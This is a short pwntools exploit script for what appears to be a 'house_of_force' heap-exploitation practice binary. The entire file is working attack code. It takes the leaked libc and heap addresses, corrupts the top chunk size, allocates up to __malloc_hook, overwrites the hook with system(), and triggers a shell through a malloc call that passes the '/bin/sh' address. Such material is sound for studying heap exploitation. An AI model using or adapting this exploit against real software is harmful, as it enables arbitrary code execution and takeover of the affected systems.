from pwn import *

elf = ELF("./house_of_force")
p = elf.process()
libc = ELF(elf.runpath + b"/libc.so.6")

def malloc(size , data):
    p.sendline(b"1")
    p.sendafter(b"size: " , f"{size}".encode())
    p.sendafter(b"data: " , data)
    p.recvuntil(b"> ")

p.recvuntil(b"puts() @ ")
libc.address = int(p.recvline() , 16) - libc.sym.puts

p.recvuntil(b"heap @ ")
heap = int(p.recvline() , 16)

log.info(f"Libc Address is at {hex(libc.address)}")
log.info(f"Heap Starts at {hex(heap)}")

p.recvuntil(b"> ")
p.timeout = 0.1

malloc(24,b'Y'*24 + p64(0xffffffffffffffff))

log.info("Changed the Top Chunk value")

distance_to_hook = (libc.sym.__malloc_hook - 0x20) - (heap + 0x20)
log.info(f"Distance to Malloc hook is : {hex(distance_to_hook)}")

malloc(distance_to_hook , b"YYYY")

malloc(24 , p64(libc.sym.system))

binsh_location = next(libc.search(b"/bin/sh"))
malloc(binsh_location , b"") 

p.interactive()
